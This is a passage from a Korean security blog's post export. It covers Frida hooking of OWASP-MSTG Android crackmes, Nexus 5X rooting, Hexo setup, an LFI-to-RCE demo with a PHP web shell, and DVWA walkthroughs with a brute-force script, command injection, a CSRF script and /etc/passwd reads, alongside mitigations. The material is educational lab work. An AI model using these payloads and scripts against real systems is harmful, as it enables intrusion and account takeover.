사진과 같이 키 값을 확인할 수 있다. 그런데 후킹을 하지 않고 이렇게 코드 분석으로만 풀 수 있었던가.. 라는 생각을해서 후킹을 통해서도 값을 얻어보기로 했다. 이번에 후킹할 때는 native code로 작성된 것을 후킹해야 하기 때문에 frida의 interceptor 기능을 사용해야 한다. https://frida.re/docs/javascript-api/#interceptor Interceptor.attach(target, callbacks) 과 같이 사용하는데 target에 so 라이브러리와 callbacks엔 Module.getExportByName()로 메서드를 넣어주면 된다. Interceptor.attach(Module.getExportByName(&quot;libfoo.so&quot;, &quot;strncmp&quot;), &#123; onEnter: function(args)&#123; if(args[2].toInt32() == 23 &amp;&amp; Memory.readCString(args[0], 23) == &quot;12345678901234567890123&quot;)&#123; console.log(&quot;Find Key! : &quot; + Memory.readCString(args[1])); &#125; &#125; &#125;) 코드는 그렇게 어렵진 않고, libfoo.so 라이브러리 내 strncmp에 접근해서 onEnter 이벤트가 발생하면, 코드를 실행하도록 구조를 만들었다. args[2].toInt32() == 23 처리를 해준 이유는 strncmp 함수를 실행하는 조건에 입력값 길이가 23을 만족해야 된다. 그래서 args[0] = 사용자 입력값에 23길이가 채워지면 Memory.readCString() 함수로 메모리에서 값을 읽도록 하였고, 아래와 같이 정상적으로 키 값을 얻어낼 수 있었다. 근데, 중간중간에 디버깅 우회 로직을 안짜놔서 디버깅 탐지도 자꾸 되길래 임시 방편으로다가 후킹을 걸어놓았는데, 단순 임시방편이라.. 다음편에는 안드로이드 어플리케이션 디버깅 우회 관련 포스팅을 작성해보고자 한다. debug_class.isDebuggerConnected.implementation = function()&#123; console.log(&quot;Debug Hooked!&quot;); return true; &#125;","categories":[{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/categories/Mobile/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://blog.jhyeon.dev/tags/Android/"},{"name":"Application","slug":"Application","permalink":"https://blog.jhyeon.dev/tags/Application/"},{"name":"Penetration","slug":"Penetration","permalink":"https://blog.jhyeon.dev/tags/Penetration/"},{"name":"OWASP-MSTG","slug":"OWASP-MSTG","permalink":"https://blog.jhyeon.dev/tags/OWASP-MSTG/"}]},{"title":"안드로이드 앱 모의해킹(OWASP-MSTG) 풀이","slug":"owasp-mstg-210131","date":"2021-02-12T15:00:00.000Z","updated":"2021-02-13T09:45:35.007Z","comments":true,"path":"2021/02/13/owasp-mstg-210131/","link":"","permalink":"https://blog.jhyeon.dev/2021/02/13/owasp-mstg-210131/","excerpt":"","text":"OWASP-MSTG란?https://github.com/OWASP/owasp-mstg 모바일 어플리케이션 보안 진단을 위한 정보들과 모의 해킹을 할 수 있는 Crackme 같은 어플리케이션을 제공한다. 앱 다운로드는 아래 링크에서 가능하다. https://github.com/OWASP/owasp-mstg/tree/master/Crackmes 분석 도구 IDA(https://www.hex-rays.com/products/ida/) FRIDA(https://frida.re/) APKTOOLS(https://ibotpeaches.github.io/Apktool/) JADX(https://github.com/skylot/jadx) JEB(https://www.pnfsoftware.com/) adb command 디바이스 &amp; PC 연결 해당 과정부터는 루팅 및 USB 디버깅 모드가 활성화 상태로만 가능합니다. 루팅 과정을 하지 않으셨다면 이전 게시글을 보고 루팅을 해주세요! (글에서는 공기계 루팅을 대상으로 진행) 또, 공기계가 따로 없으신분들은 Nox 가상 앱 플레이어 를 사용하셔도 무방합니다. adb devices # 연결된 디바이스 확인 adb shell # 디바이스 쉘 접속 su # root 권한 요청 Frida Server Install루팅이 완료되었다면, 이제 분석 디바이스에 Frdia Server 서비스를 설치하고 구동시켜야 한다. (Frida 분석 목적) https://github.com/frida/frida/releases 사진과 같이 Release 버전들이 업로드되어 있는데 본인의 디바이스 환경에 맞는 펌웨어를 선택해서 다운로드 받자. 본인의 디바이스 환경은 adb shell 환경에서 cat /proc/cpuinfo 명령어를 통해 확인할 수 있다. 다운로드가 완료되었으면, 아래 명령어를 통해 디바이스 로컬 저장소에 파일을 넣어준 뒤 실행하자. adb push &lt;filename&gt; /date/local/tmp ./&lt;binary filename&gt; &amp; Frida Server를 실행시킨 뒤 adb shell 모드를 빠져나와서 아래 명령어를 입력해보자. frida-ps -U 위 과정이 잘 진행이 되었다면 아래와 같은 목록이 표시될 것이다. App Analysis(1) - Decompile to APK이제 본격적인 앱 분석을 위해 어플리케이션 디컴파일 과정을 거쳐 smail 코드를 볼 것이다. 디컴파일 도구로는 본문에 표시된 apktool, jadx, jeb 도구를 활용할 수 있다. 우선 apktools로 APK를 디컴파일 하는 과정은 아래 명령어로 수행할 수 있다. apktool d &lt;application&gt; 어플리케이션 디컴파일이 완료되었다면 아래 사진과 같이 어플리케이션을 빌드한 파일들과 smail 코드가 나온다. App Analysis(2) - Analyze to APK이제, 어플리케이션 디컴파일 과정을 거쳤다면 앱 로직에 대해서 분석해보는 단계이다. JADX 도구를 활용하면 위 사진과 같이 java 코드를 확인할 수 있으니 참고하도록 하자. 우선 다운로드 받은 APK를 루팅 기기에서 일반적으로 실행하면, 루팅 탐지 로직때문에 강제 종료가 된다. 그 로직을 분석한다음 우회를 해볼건데 하나씩 해보자 앱이 실행될 때 동작하는 onCreate() 함수 부분을 보면 c.a(), c.b(), c.c() 로직과 같이 루팅된 디바이스일 경우 탐지하는 로직과 디버깅 모드를 탐지하는 로직이 있다. 위 두 사진은 디바이스의 루팅 상태를 체크하는 로직, 디버깅 모드 여부를 체크하는 로직이다. 루팅의 경우 다들 아실만한 SuperSu 관련 파일들이 눈에 띄게 보인다. 뭐.. 아무튼 시스템 경로나 루팅과 연관된 파일을 검사하는 정도이고 두 번째 사진에서는 context.getApplicationContext().getApplicationInfo().flags 이 부분이 디버깅 모드 상태를 확인하는 것이다. 위 두가지 로직에 하나라도 해당되는 상태라면, 앱이 정상적으로 실행되지 않고. exit() 함수가 실행되어 앱이 종료될 것이다. App Analysis(3) - Root Detected Bypass그럼 루팅이 감지되었을 때 우회하는 방법은 어떻게 될까. 위에서 분석해봤듯이, 루팅이나 디버깅 체크 로직에 탐지될 경우 exit() 함수가 실행되는데 이 함수를 후킹해서 자신이 원하는 흐름으로 흘러가게 할 수 있다. (exit() 함수가 동작하지 않도록 한다거나..) 위 경우 Frida로 특정 함수를 후킹해서 진행할 수 있는데 예제 코드는 사진과 같다. 코드를 뚝딱하고나서 앱 실행 -&gt; 코드 실행을 해보면 사진과 같이 exit() 함수가 후킹되었다고 출력되고, 실제 앱에서 봤을 때도 exit() 함수가 실행되지 않아 앱이 작동하는 화면이다. App Analysis(4) - Get Secret Key 루팅 탐지 우회만이 끝이 아니다. 앱을 보면 특정 키값을 입력하여 확인하는 로직이 있다. a.a() 조건을 만족할 경우 Success 제목과 correct 메세지를 띄워주고, 그게 아니라면 Nope..(try again) 문구를 띄운다. 키를 만들것 같은 부분은 a.a() 에 존재하는데 해당 로직을 따라가면 사진과 같이 확인할 수 있다. 8d127684cbc37c17616d806cf50473cc 이 값을 b()에 넣고 5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc= 값을 Base64-Decode 한 값을 sg.vantagepoint.a.a.a 함수를 호출하여 bArr 라는 변수에 저장하게 됩니다. 이후 bArr에 저장된 값과 입력한 값을 비교하여 return (true/false)를 반환 해주고 있다. 따라서, 키 값을 만들어주는 함수를 후킹해서 값을 확인할 것이다. Java.perform(function() &#123; var secret_class = Java.use(&quot;sg.vantagepoint.a.a&quot;); secret_class.a.implementation = function(arr1, arr2)&#123; var retval = this.a(arr1, arr2); var secret_msg = &quot;&quot;; for(var i=0; i &lt; retval.length; i++)&#123; secret_msg += String.fromCharCode(retval[i]); &#125; console.log(&quot;[*] Secret Method Hooking!!&quot;); console.log(secret_msg); return retval; &#125; &#125;); 후킹하는 코드는 간단하다. exit() 함수를 후킹할 때와 비슷한 방향으로 진행하면 되는데 sg.vantagepoint.a.a.a 는 인자가 2개이기 때문에 그에 맞게 인자를 처리해주고, for문을 활용해서 fromCharCode(문자열 변환) 함수로 변수하나를 지정해서 키 값을 저장해주면 된다. 결과로 Secret key 값을 정상적으로 얻어낼 수 있다. 기타본문에 사용된 코드는 아래 깃허브에서 확인할 수 있습니다. 다음편에서 계속… https://github.com/jhye0n/android_frida_python","categories":[{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/categories/Mobile/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://blog.jhyeon.dev/tags/Android/"},{"name":"Application","slug":"Application","permalink":"https://blog.jhyeon.dev/tags/Application/"},{"name":"Penetration","slug":"Penetration","permalink":"https://blog.jhyeon.dev/tags/Penetration/"},{"name":"OWASP-MSTG","slug":"OWASP-MSTG","permalink":"https://blog.jhyeon.dev/tags/OWASP-MSTG/"}]},{"title":"(스터디 자료) 안드로이드 앱 분석 기초 part.1","slug":"android-app-penetration-study-210131","date":"2021-01-31T06:09:52.000Z","updated":"2021-01-31T06:12:42.951Z","comments":true,"path":"2021/01/31/android-app-penetration-study-210131/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/31/android-app-penetration-study-210131/","excerpt":"","text":"Linkhttps://drive.google.com/file/d/1CVK_wyioojm3qDyqXUAxTVYLEak8ih4F/view?usp=sharing 해당 자료를 활용한 무단 배포 등의 행위는 금지합니다.","categories":[{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/categories/Mobile/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://blog.jhyeon.dev/tags/Android/"},{"name":"Application","slug":"Application","permalink":"https://blog.jhyeon.dev/tags/Application/"},{"name":"Penetration","slug":"Penetration","permalink":"https://blog.jhyeon.dev/tags/Penetration/"},{"name":"Study","slug":"Study","permalink":"https://blog.jhyeon.dev/tags/Study/"}]},{"title":"넥서스 5X 벽돌폰 복구 + 루팅","slug":"android-rootkit-210131","date":"2021-01-30T15:00:00.000Z","updated":"2021-01-31T06:08:13.029Z","comments":true,"path":"2021/01/31/android-rootkit-210131/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/31/android-rootkit-210131/","excerpt":"","text":"벽돌폰 계기최근에 BoB 프로젝트 때 썼던 도구들도 있고 이를 바탕으로 앱 모의해킹 한번 시도해보고자 잠들어있던 Nexus 5X 공기계를 살려냈다. 근데 이폰이 루팅만 해놓고 몇번 테스트용도로만 쓰다가 안써왔더니 터치도 안되고 해서 그냥 포맷하고 다시 루팅을 걸어서 앱 분석을 하려고 했으나.. 루팅 하는 과정에서 실수(?)로 인하여 벽돌폰을 만들어버렸다. (ㅎㅎ) 그래서 Nexus Root Toolkit 2.19 프로그램을 써서 복구를 했는데 과정은 크게 어렵진 않아서 생략한다. 다만 이 프로그램이 패치가 2년전?부터 중단했기 때문에 펌웨어는 다소 구버전 일 수 있으나 살려내는게 큰 목적이라면 이것도 상관없다. 루팅 재 시도이번에 루팅을 할 때는 그냥 수동으로 oem unlock 걸고 해서 한 방법인데 아래와 같이 수행했다. OEM 잠금 해제 -&gt; USB 디버깅 활성화 안드로이드 스튜디오 &amp; platform tools 설치 https://developer.android.com/studio/install?hl=ko 디바이스랑 PC를 USB로 연결해서 adb 사용 adb devices # 현재 현결된 디바이스 확인 adb reboot bootloader # 부트로더 화면으로 재부팅 fastboot oem unlock # oem unlock fastboot reboot # 재부팅 TWRP Recovery 도구 설치 https://dl.twrp.me/bullhead/ 루팅(1) adb reboot bootloader fastboot flash recovery &lt;imgfile&gt; adb reboot bootloader SuperSU 다운로드 adb push BETA-SuperSU-v2.66-20160103015024.zip /sdcard/ 이런 과정이 사실 좀 복잡한데, 위에 언급됐던 Nexus Root Toolkit 2.19 써서 원클릭으로 루팅도 가능하니 알아두자..","categories":[{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/categories/Mobile/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://blog.jhyeon.dev/tags/Android/"},{"name":"Root","slug":"Root","permalink":"https://blog.jhyeon.dev/tags/Root/"},{"name":"Nexus5X","slug":"Nexus5X","permalink":"https://blog.jhyeon.dev/tags/Nexus5X/"}]},{"title":"LFI를 활용한 RCE 연계하기","slug":"lfi-to-rce-210123","date":"2021-01-22T15:00:00.000Z","updated":"2021-01-23T01:15:28.003Z","comments":true,"path":"2021/01/23/lfi-to-rce-210123/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/23/lfi-to-rce-210123/","excerpt":"","text":"IntroDVWA 리뷰를 할 때 LFI 공격에 관해서 잠깐 다뤄보았을 때 LFI를 활용해 어떤 추가 공격이 나올 수 있는지 작성하기로 했었다. 이번 글에서는 RCE(Remote Code Execution)을 연계하는 방법에 대해서 적어볼 것이다. LFI &amp; RFI 개념LFI(Local File Inclusion) 취약점은 내부 서버 파일을 읽어올 수 있는 취약점입니다.RFI(Remote File Inclusion) 취약점은 외부 서버 로 부터의 파일을 읽어올 수 있는 취약점입니다. 즉, 내부에서 불러오는 것과 외부에서 불러온다는 점에서 약간의 차이가 있지만 두 취약점의 역할은 동일합니다. 테스트(1) LFI 환경 만들기우선 LFI를 테스트해볼 환경을 간단하게만 만들어보겠습니다. test.php(테스트 페이지) &lt;!DOCTYPE html&gt; &lt;html lang=&quot;ko&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt; test page &lt;/title&gt; &lt;/head&gt; &lt;body&gt; get &lt;?php include($_GET[&#39;page&#39;]); ?&gt; &lt;/body&gt; &lt;/html&gt; 코드에는 LFI 취약점을 발생시키기 위한 include 함수만을 사용하였고, 나머지는 표준 html 작성 방식입니다. 이제 해당 코드에서 page 인자를 통한 내부 파일을 로드시켜보겠습니다. ?page=/etc/passwd 서버 내부의 /etc/passwd 파일을 정상적으로 읽어오면서 화면에 출력이 가능하게 됩니다. 이런 공격을 바로 LFI 취약점이라고 할 수 있고 여기서 조금 더 연계해서 RCE까지 가봅시다. 테스트(2) LFI &amp; RCE우선 Remote(외부) 환경의 파일을 로드하기 위해 설정 해야 할 옵션들이 있습니다. (php.ini) allow_url_include = On 웹을 실제로 운영할 때는 이런 옵션 하나하나 숙지하시고 관리를 잘 해주셔야 하고 평상시에는 On으로 두시면 안됩니다. 이후, 아래 웹 쉘을 실행시키는 페이로드를 간단하게 짜서 페이지에 로드시켜보겠습니다. payload.php &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt; 그러면, test.php(메인 테스트 페이지)에서 해당 파일을 어떻게 불러올 수 있을까요. ?page=http://~~/payload.php?cmd=pwd 이런 공격 URL이 나오게 되겠죠. payload.php를 불러와서 현재 페이지에 로드시켜보면 다음과 같이 웹 쉘을 작동시킬 수 있습니다.","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://blog.jhyeon.dev/tags/RCE/"},{"name":"LFI","slug":"LFI","permalink":"https://blog.jhyeon.dev/tags/LFI/"},{"name":"Pentesting","slug":"Pentesting","permalink":"https://blog.jhyeon.dev/tags/Pentesting/"}]},{"title":"(GitHub) Hexo Blog 설치하기!","slug":"hexoblog-210120","date":"2021-01-19T15:00:00.000Z","updated":"2021-01-20T12:59:08.341Z","comments":true,"path":"2021/01/20/hexoblog-210120/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/20/hexoblog-210120/","excerpt":"","text":"Hexo Intro해당 포스트에서는 Hexo를 사용한 GitHub 블로그 운영에 대해서 소개해볼까 한다. 우선 사진과 같이 Github Blog 생성을 위한 새 Repo를 만들어주자. Repo명은 자신의 github name과 동일하게 만들어야 한다. (ex. jhye0n.github.io) 이후 하단에 ADD a README file 옵션을 선택하고 생성하자 (해당 옵션은 README.md 파일을 미리 만들어주는 옵션) 그리고 보면, 자신의계정명.github.io 라는 Repo가 만들어지는데 이제 로컬에서 Hexo를 설치해보자. Hexo InstallationHexo는 우선 Node.js 기반으로 동작하는 프레임워크이므로, 시스템에 node.js 설치를 필요로 한다. Node.js (https://nodejs.org/ko/) 설치가 완료되었다면 터미널을 열어서 다음과 같은 명령어를 입력하자. “블로그 폴더 경로는 본인의 선택” npm install hexo-cli -g 터미널에 해당 명령어를 입력하면 hexo를 설치하게 될 것이다. 이후 블로그를 생성하는 방법은 아래와 같다. hexo init &lt;name&gt; cd &lt;name&gt; npm install --save name에는 본인의 블로그 폴더명을 지정하면 된다. 이후 hexo 서버를 로컬에서 실행해보려면 다음과 같이 하면 된다. hexo server hexo s로 줄여서 사용도 가능하니 참고하자~! 그러면 localhost:4000 으로 서버가 열릴텐데 접속해서 정상적으로 설치되었는지 확인해보면 된다. Hexo Build &amp; Deploy블로그를 만들었으면 이제 본인의 GitHub에 배포를 해야 하는 작업이 필요하다. (깃허브 주소로 서버를 돌릴려면~) 우선 아래 명령어를 통해 배포용 파일을 만들자 hexo clean &amp;&amp; hexo generate 두 명령어는 clean을 통해서 기존의 배포판 파일을 삭제한 뒤 generate로 재생성 하는 명령어이다. 이후 아래 명령어를 통해 git deploy package를 설치하자. npm install hexo-deployer-git --save 패키지 설치가 끝났으면, _config.yml 파일의 하단에 아래와 같이 수정하자 # Deployment ## Docs: https://hexo.io/docs/one-command-deployment deploy: type: git repo: &#39;본인의 깃허브 Repo&#39; branch: &#39;본인의 깃허브 Repo -&gt; Branch&#39; 이렇게까지 세팅하고 이제 마지막 한 단계만 더 하면 깃허브에 배포가 될 것이며 아까 생성한 Repo의 주소로 Hexo 블로그 뼈대가 만들어 질 것이다! hexo deploy","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Github","slug":"Github","permalink":"https://blog.jhyeon.dev/tags/Github/"},{"name":"Hexo","slug":"Hexo","permalink":"https://blog.jhyeon.dev/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://blog.jhyeon.dev/tags/Blog/"}]},{"title":"OWASP TOP 10 2021 제안 자료","slug":"owasp2021-210120","date":"2021-01-19T15:00:00.000Z","updated":"2021-01-20T12:34:03.591Z","comments":true,"path":"2021/01/20/owasp2021-210120/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/20/owasp2021-210120/","excerpt":"","text":"4년마다 OWASP 에서는 웹 애플리케이션에서 발생한 주요 취약점 리스트(top 10/category) 정보를 주는데, 올해에도 제안 자료가 있어서 링크를 남겨본다. (공식 정보는 아닙니당) https://lab.wallarm.com/owasp-top-10-2021-proposal-based-on-a-statistical-data/?amp&amp;fbclid=IwAR1oIWYr_bXxragBk1OJEX4WasafYOUbyv-61z5wAKicIa6RwuPlJbxJnrc References Play The Web","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"OWASP","slug":"OWASP","permalink":"https://blog.jhyeon.dev/tags/OWASP/"}]},{"title":"DVWA 웹 취약점 모의 훈련 도구 리뷰","slug":"dvwa-review-210119","date":"2021-01-18T15:00:00.000Z","updated":"2021-01-22T04:39:14.714Z","comments":true,"path":"2021/01/19/dvwa-review-210119/","link":"","permalink":"https://blog.jhyeon.dev/2021/01/19/dvwa-review-210119/","excerpt":"","text":"IntroDVWA는 웹 취약점 모의 해킹(훈련) 도구이며 다운로드는 아래 링크에서 가능합니다. http://www.dvwa.co.uk 해당 포스트에서는 초심자인 easy 난이도와 대응 방안에 대해서만 작성합니다. 기능 별 순차적으로 업데이트 할 예정입니다! Brute Force해당 문제는 제목 답게 “Brute Force(무차별 대입 공격)” 기법을 사용하는 문제이다. 그냥 평범하게 로그인 창이 있는데, 공격 벡터는 두군데 밖에 없다. (아이디 / 패스워드 입력폼) 사용자로부터 입력을 받는 폼에서 이제 무차별 대입 공격 기법을 시도하여 계정을 알아내는 방식이다. &lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123; // Get username $user = $_GET[ &#39;username&#39; ]; // Get password $pass = $_GET[ &#39;password&#39; ]; $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; 로직은 매우 간단하다. POST 방식으로 넘어온 username, password 값을 받아서 각각 $user, $pass 변수에 저장한다. // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); 이후 넘어온 $user(username) 값과 $pass(password) 값을 users 테이블과 매칭해 데이터가 있는지 조회하는 쿼리문을 작성했다. 일치하는 정보가 있으면 login successful 로 넘어갈 것이고, 없거나 하나라도 틀린정보가 있다면 login failed 로직쪽으로 넘어갈 것이다. 해당 단계는 아래 python 코드를 사용하여 풀이할 수 있다. #!/usr/bin/python3 import requests from time import sleep url = &quot;http://192.168.25.60:4731/vulnerabilities/brute/&quot; session = &#123;&quot;PHPSESSID&quot;:&quot;sessionid&quot;,&quot;security&quot;:&quot;low&quot;&#125; with open(&#39;password.txt&#39;) as f: while True: line = f.readline().splitlines() param = &#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:line, &quot;Login&quot;:&quot;Login&quot;&#125; r = requests.get(url, params=param, cookies=session) sleep(1) if(&quot;Welcome to the password protected area admin&quot; in r.text): print(&quot;password matching!!&quot;,line) else: print(&quot;not match&quot;) if not line: break 코드에 사용된 “password.txt”는 github에 검색좀 해보면 나오는 리스트들이다. 이러한 비밀번호 리스트들을 사용해서 한줄씩 대입을 하여 로그인이 됐을 때의 상태 / 실패했을 때의 상태를 체크해서 문제를 풀어주면 된다. Brute Force (대응 방안)무차별 대입 공격을 막는 방법은 여러가지가 있을 수 있지만 자동화 도구나 봇을 통해 작업을 하는 것을 차단할 수 있는 “google recapture”를 적용하면 된다. 또한 연속적으로 시도하지 못하도록 “최대 시도 횟수 제한” 기능을 넣는다면 이런 공격으로부터 방어를 할 수 있지 않나 싶다. Command Injection커맨드 인젝션(Cmd Injection) 공격은 웹 앱에서 시스템 명령을 사용할 때 적절한 필터링 조치가 되어 있지 않은 경우 하나의 커맨드안에서 두개의 명령을 실행 해 공격자가 원하는 결과를 얻어낼 수 있는 공격입니다. &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123; // Get input $target = $_REQUEST[ &#39;ip&#39; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123; // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 우선 코드를 분석해보면 REQUEST로 사용자로 부터 ip값을 입력받아 $target 변수에 저장하고, 하단의 shell_exec 시스템 함수로 ping 명령을 수행합니다. ex) shell_exec(ping 127.0.0.1) ex) shell_exec(ping -c 4 127.0.0.1) 넘어온 ip를 대입해서 함수를 맞춰보면 이런 구조가 되겠죠. 다만, 아래와 같이 사용할 경우 커맨드 인젝션이 발생하게 됩니다. ping -c 4 127.0.0.1 | pwd 127.0.0.1로 핑을 보내는 동시에 뒤에 |(파이프라인)으로 처리된 pwd 명령까지 함께 실행하게 됩니다. 즉 하나의 커맨드안에서 두개의 명령을 실행하는 것이 가능하다는 의미이죠. 실무에서는 잘 없겠지만 매~~우매우 취약한 사이트에 이런 기능이 있다고 하면 공격자가 RCE 환경을 만들어버릴 수 있는 취약점입니다. Command Injection(대응 방안)제가 생각하기엔, 실무나 회사에서 과연 이런 시스템 함수를 써서 뭔가의 기능을 사용할 일이 있나 싶습니다. 그러나, 다방면으로 쓰는 분들이 있을 수 있기에 간단한 대응 방안을 나열해봅시다. 특수문자 필터링 입력값 regex 정규식 표현 사용 화이트 리스트 기반 명령어 실행 (사용할 수 있는 명령어 제한) 뭐 이정도가 될 수 있겠네요 ㅎㅎ.. CSRFCSRF(Cross Site Request Forgery)는 공격자가 수정, 삭제 등의 행위를 CSRF 취약점이 발생하는 웹 페이지에, 요청을 보내 처리하는 방식의 취약점을 의미합니다. DVWA에서의 CSRF 폼은 아래와 같습니다. &lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123; // Get input $pass_new = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; 소스코드를 분석해보면 간단한 로직으로 기능이 돌아갑니다. 새 비밀번호, 새 비밀번호 체크 두 가지 값을 입력받아서, 두 값이 같은지 검사한 뒤 users 테이블의 현재 유저(dvwa 로그인 사용자)에 대한 비밀번호를 업데이트하는 쿼리문을 요청합니다. 여기서 CSRF 취약점이 어디서 발생하냐 할 수 있는데, 자세히 보면 현재 비밀번호를 변경할 때 입력 값을 통해 바로 업데이트 쿼리문을 수행합니다. 그럼, 공격자의 입장에서는 비밀번호 변경 페이지에 변경할 비밀번호 값과 함께 요청을 보내는 방식의 공격을 통해 사용자의 비밀번호를 변경이 가능합니다. #!/usr/bin/python3 import requests url = &quot;http://192.168.25.61:4731/vulnerabilities/csrf/&quot; session = &#123;&quot;PHPSESSID&quot;:&quot;sessionid&quot;,&quot;security&quot;:&quot;low&quot;&#125; param = &#123;&quot;password_new&quot;:&quot;0000&quot;, &quot;password_conf&quot;:&quot;0000&quot;, &quot;Change&quot;:&quot;Change&quot;&#125; r = requests.get(url, params=param, cookies=session) if(&quot;Password Changed.&quot; in r.text): print(&quot;password changed!&quot;) else: print(&quot;password change failed&quot;) python 경우에는 위 코드로 쉽게 수정이 가능합니다. 해당 방법 이외에도 공격자 입장에서는 가짜 페이지를 만들어서 그쪽으로 유도하거나 이메일 통해서도 공격 시도가 가능하게 됩니다. CSRF (대응 방안) CSRF TOKEN 추가 https://portswigger.net/web-security/csrf/tokens HTTP Header(Referer) 검증 https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Referer File InclusionFile Inclusion이란, LFI(Local FIle Include)와 동일한 개념이라고 생각하면 됩니다. 즉, 로컬 저장소에 저장된 파일을 페이지에서 불러올 수 있는 취약점입니다. &lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; ?&gt; low 레벨에서는 소스코드가 매우 간단합니다. page 파라미터를 넘겨받아서 그대로 페이지에 include 해주는 로직입니다. 그럼 여기서, 페이지에 나와있는 file1, fil2, file3.php는 당연히 로컬 서버의 저장소에 저장이 되어 있겠죠? 이런 점을 생각해서 다른 로컬 파일들을 읽어오면 됩니다. ?page=/etc/passwd ?page=/etc/~~ ... LFI를 활용해서는 php 설정 옵션인 allow_url_include 가 ON으로 되어 있을 경우 RFI(Remote File Inclusion) 외부 URL를 읽어서 페이지에 로드하는 것도 가능합니다. 이에 대해서는 DVWA 리뷰가 아닌 LFI &amp; RCE 라는 주제로 새 포스팅에서 다뤄볼 예정입니다. File Inclusion(대응 방안) php를 사용할 때 외부 파일을 로드하지 못하도록 allow_url_include, url_fopen 옵션 OFF 입력값 필터링(preg_match, regex 등) 특정 디렉토리에서만 파일을 읽어올 수 있도록 조치 File Upload파일 업로드(File Upload) 취약점을 다루는 페이지입니다. 파일 업로드 취약점은 웹 애플리케이션 내 서버에 파일을 업로드 하는 기능이 있을 때 업로드 하는 파일에 대한 검사를 하지 않고 서버에 다이렉트로 